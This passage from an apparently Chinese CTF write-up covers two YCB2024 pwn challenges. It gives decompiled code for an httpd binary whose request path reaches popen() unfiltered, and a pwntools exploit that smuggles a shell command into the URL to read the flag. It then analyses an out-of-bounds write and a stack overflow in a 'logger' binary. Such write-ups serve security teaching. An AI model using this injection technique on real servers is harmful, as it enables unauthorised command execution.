class="built_in">int</span>)<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v22 )</span><br><span class="line">      *v22 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strlen(has_host + <span class="number">6</span>) &lt;= <span class="number">7</span> )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Host len error.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( has_host == (char *)-<span class="number">6</span> || !has_host[<span class="number">6</span>] )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Host fmt error.&quot;</span>);</span><br><span class="line">  v42 = &amp;v17;</span><br><span class="line">  HIDWORD(v41) = &amp;v16;</span><br><span class="line">  __isoc99_sscanf(has_host + <span class="number">6</span>, <span class="string">&quot;%d.%d.%d.%d%c&quot;</span>, &amp;v13, &amp;v14, &amp;v15);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(input_data, <span class="number">10000</span>, stdin) )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Missing Content-Length.&quot;</span>);</span><br><span class="line">  has_host = strstr(input_data, <span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !has_host )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Missing Content-Length.&quot;</span>);</span><br><span class="line">  v22 = strstr(has_host + <span class="number">16</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v22 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = strchr(has_host + <span class="number">16</span>, (<span class="built_in">int</span>)<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v22 )</span><br><span class="line">      *v22 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strlen(has_host + <span class="number">16</span>) &gt; <span class="number">5</span> )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Content-Length len too long.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(httpMethod, <span class="string">&quot;get&quot;</span>) )</span><br><span class="line">    puts_error(<span class="number">501</span>, (<span class="built_in">int</span>)<span class="string">&quot;Not Implemented&quot;</span>, <span class="number">0</span>, <span class="string">&quot;That method is not implemented.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strncmp(httpVersion, <span class="string">&quot;HTTP/1.0&quot;</span>, 8u) )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Bad protocol.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( requestPath != <span class="number">47</span> )</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Bad filename.&quot;</span>);</span><br><span class="line">  haystack = v37;</span><br><span class="line">  urldecode(v37, v37);</span><br><span class="line">  <span class="keyword">if</span> ( !*haystack )</span><br><span class="line">    haystack = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">  v20 = strlen(haystack);</span><br><span class="line">  <span class="keyword">if</span> ( *haystack == <span class="string">&#x27;/&#x27;</span>                         // 目录穿越检查</span><br><span class="line">    || !strcmp(haystack, <span class="string">&quot;..&quot;</span>)</span><br><span class="line">    || !strncmp(haystack, <span class="string">&quot;../&quot;</span>, 3u)</span><br><span class="line">    || strstr(haystack, <span class="string">&quot;/../&quot;</span>)</span><br><span class="line">    || !strcmp(&amp;haystack[v20 - <span class="number">3</span>], <span class="string">&quot;/..&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts_error(<span class="number">400</span>, (<span class="built_in">int</span>)<span class="string">&quot;Bad Request&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Illegal filename.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_1F74(haystack) )</span><br><span class="line">    puts_error(<span class="number">404</span>, (<span class="built_in">int</span>)<span class="string">&quot;Not Found&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Invalid file name.&quot;</span>);</span><br><span class="line">  v3 = fileno(stdout);</span><br><span class="line">  stdout_fd = dup(v3);</span><br><span class="line">  v4 = fileno(stderr);</span><br><span class="line">  v24 = dup(v4);</span><br><span class="line">  freopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line">  freopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>, stderr);</span><br><span class="line">  stream = popen(haystack, modes);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    pclose(stream);</span><br><span class="line">    v6 = fileno(stdout);</span><br><span class="line">    dup2(stdout_fd, v6);</span><br><span class="line">    v7 = fileno(stderr);</span><br><span class="line">    dup2(v24, v7);</span><br><span class="line">    close(stdout_fd);</span><br><span class="line">    close(v24);</span><br><span class="line">    <span class="keyword">if</span> ( stat(haystack, &amp;v29) &lt; <span class="number">0</span> )</span><br><span class="line">      puts_error(<span class="number">404</span>, (<span class="built_in">int</span>)<span class="string">&quot;Not Found&quot;</span>, <span class="number">0</span>, <span class="string">&quot;File not found.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (v29.st_mode &amp; <span class="number">0xF000</span>) == <span class="number">0x4000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( haystack[v20 - <span class="number">1</span>] != <span class="number">47</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        snprintf(v40, 0x4E20u, <span class="string">&quot;Location: %s/&quot;</span>, &amp;requestPath);</span><br><span class="line">        puts_error(<span class="number">302</span>, (<span class="built_in">int</span>)<span class="string">&quot;Found&quot;</span>, (<span class="built_in">int</span>)v40, <span class="string">&quot;Directories must end with a slash.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      snprintf(file, 0x4E20u, <span class="string">&quot;%sindex.html&quot;</span>, haystack);</span><br><span class="line">      <span class="keyword">if</span> ( stat(file, &amp;v29) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_23D9(<span class="number">200</span>, <span class="string">&quot;Ok&quot;</span>, <span class="number">0</span>, (<span class="built_in">int</span>)<span class="string">&quot;text/html&quot;</span>, -<span class="number">1</span>, v29.st_mtim.tv_sec);</span><br><span class="line">        v26 = scandir(haystack, &amp;namelist, <span class="number">0</span>, (<span class="built_in">int</span> (*)(const void *, const void *))&amp;alphasort);</span><br><span class="line">        <span class="keyword">if</span> ( v26 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v26; ++i )</span><br><span class="line">          &#123;</span><br><span class="line">            sub_2704(v32, 0x3E8u, (unsigned __int8 *)namelist[i]-&gt;d_name);</span><br><span class="line">            snprintf(file, 0x4E20u, <span class="string">&quot;%s/%s&quot;</span>, haystack, namelist[i]-&gt;d_name);</span><br><span class="line">            <span class="keyword">if</span> ( lstat(file, &amp;v29) &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v8 = localtime(&amp;v29.st_mtim.tv_sec);</span><br><span class="line">              strftime(v31, 0x10u, <span class="string">&quot;%d%b%Y %H:%M&quot;</span>, v8);</span><br><span class="line">              printf(<span class="string">&quot;&lt;a href=\&quot;%s\&quot;&gt;%-32.32s&lt;/a&gt;%15s %14lld\n&quot;</span>, v32, namelist[i]-&gt;d_name, v31, (__int64)v29.st_size);</span><br><span class="line">              sub_20C6(file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              printf(<span class="string">&quot;&lt;a href=\&quot;%s\&quot;&gt;%-32.32s&lt;/a&gt;    ???\n&quot;</span>, v32, namelist[i]-&gt;d_name);</span><br><span class="line">            &#125;</span><br><span class="line">            printf(</span><br><span class="line">              <span class="string">&quot;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;address&gt;&lt;a href=\&quot;%s\&quot;&gt;%s&lt;/a&gt;&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n&quot;</span>,</span><br><span class="line">              <span class="string">&quot;https://2024ycb.dasctf.com/&quot;</span>,</span><br><span class="line">              <span class="string">&quot;YCB2024&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          perror(<span class="string">&quot;scandir&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        goto LABEL_74;</span><br><span class="line">      &#125;</span><br><span class="line">      haystack = file;</span><br><span class="line">    &#125;</span><br><span class="line">    v27 = fopen(haystack, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v27 )</span><br><span class="line">      puts_error(<span class="number">403</span>, (<span class="built_in">int</span>)<span class="string">&quot;Forbidden&quot;</span>, <span class="number">0</span>, <span class="string">&quot;File is protected.&quot;</span>);</span><br><span class="line">    tv_sec = v29.st_mtim.tv_sec;</span><br><span class="line">    st_size = v29.st_size;</span><br><span class="line">    v11 = sub_2566(haystack);</span><br><span class="line">    sub_23D9(<span class="number">200</span>, <span class="string">&quot;Ok&quot;</span>, <span class="number">0</span>, (<span class="built_in">int</span>)v11, st_size, tv_sec);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      c = getc(v27);</span><br><span class="line">      <span class="keyword">if</span> ( c == -<span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      putchar(c);</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_74:</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v44 != __readgsdword(0x14u) )</span><br><span class="line">    check_canary();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序的逻辑很长，实现了一个http request parse，然后相应请求，大多数逻辑都是对http request的格式做判断，还有目录穿越的检查</p>
+<p>漏洞出在这里popen这里</p>
+
+
+<p>这个popen会fork一个子进程，然后调用shell，把参数传过去，也没有做过滤，所以可以通过这里执行命令</p>
+
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;139.155.126.78&quot;</span></span><br><span class="line">PORT = <span class="number">30523</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;GET &#x27;</span>,<span class="string">b&#x27;/cat%20%2Fflag%20%3E%20flag.txt &#x27;</span>,<span class="string">b&#x27;HTTP/1.0\r\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Host: 00.00.00.00\r\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Content-Length: 0\r\n&#x27;</span></span><br><span class="line">])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;GET &#x27;</span>,<span class="string">b&#x27;/flag.txt &#x27;</span>,<span class="string">b&#x27;HTTP/1.0\r\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Host: 00.00.00.00\r\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Content-Length: 0\r\n&#x27;</span></span><br><span class="line">])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+4h] [rbp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_io(a1, a2, a3);</span><br><span class="line">  choice = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Trace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      warn();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_io</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Trace</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+26h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nYou can record log details here: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_404020[<span class="number">16</span> * i + read(<span class="number">0</span>, &amp;byte_404020[<span class="number">16</span> * i], <span class="number">0x10</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Do you need to check the records? &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1s&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v4 == <span class="number">121</span> || (_BYTE)v4 == <span class="number">89</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * j] &amp;&amp; v3; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31mRecord%d. %.16s\x1B[0m&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(j + <span class="number">1</span>), &amp;byte_404020[<span class="number">16</span> * j]);</span><br><span class="line">        --v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_BYTE)v4 != <span class="number">110</span> &amp;&amp; (_BYTE)v4 != <span class="number">78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input. Please enter &#x27;y&#x27; or &#x27;n&#x27;.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Records have been filled :(&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">warn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">5</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  clean_up(buf);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  sub_4014FD(v5, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\x1B[1;31m%s\x1B[0m\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[!] Type your message here plz: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  HIBYTE(v3) = HIBYTE(v0);</span><br><span class="line">  buf[v0 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(byte_404200, buf, <span class="keyword">sizeof</span>(byte_404200));</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;dest[<span class="built_in">strlen</span>(dest)], <span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(dest, byte_404200, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(dest);</span><br><span class="line">    exception = __cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = src;</span><br><span class="line">    __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> *, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(byte_404100, buf, <span class="keyword">sizeof</span>(byte_404100));</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  sub_4014FD(v6, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[User input log]\nMessage: %s\nDone at %s\n&quot;</span>, byte_404100, (<span class="type">const</span> <span class="type">char</span> *)v6);</span><br><span class="line">  sub_401CCA(buf);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序有两个漏洞 Trace函数循环边界没有处理好 有一个越界写的漏洞，可以把buffer overflow这个字段覆盖一部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000404020</span> <span class="number">00</span> <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+byte_404020 db <span class="number">0</span>, <span class="number">0</span>Ah, <span class="number">7</span>Eh <span class="title function_">dup</span><span class="params">(<span class="number">0</span>)</span>       ; DATA XREF: Trace+<span class="number">58</span>↑o</span><br><span class="line">.data:<span class="number">0000000000404020</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+                                        ; Trace+<span class="number">9F</span>↑o</span><br><span class="line">.data:<span class="number">0000000000404020</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+                                        ; Trace+CE↑o</span><br><span class="line">.data:<span class="number">0000000000404020</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+                                        ; Trace+<span class="number">147</span>↑o</span><br><span class="line">.data:<span class="number">0000000000404020</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+                                        ; Trace+<span class="number">168</span>↑o</span><br><span class="line">.data:<span class="number">00000000004040</span>A0                               ; <span class="type">char</span> src[]</span><br><span class="line">.data:<span class="number">00000000004040</span>A0 <span class="number">42</span> <span class="number">75</span> <span class="number">66</span> <span class="number">66</span> <span class="number">65</span> <span class="number">72</span> <span class="number">20</span> <span class="number">4F</span> <span class="number">76</span> <span class="number">65</span>+src db <span class="string">&#x27;Buffer Overflow&#x27;</span>,<span class="number">0</span>  </span><br></pre></td></tr></table></figure>
+
+<p>warn有一个栈溢出的漏洞，但是有一个输入长度的检查，如果输入长度 &gt; 0x10就会进到异常处理的逻辑然后throw一个buffer overflow的字段，由外面一层函数的catch捕获后 handler</p>
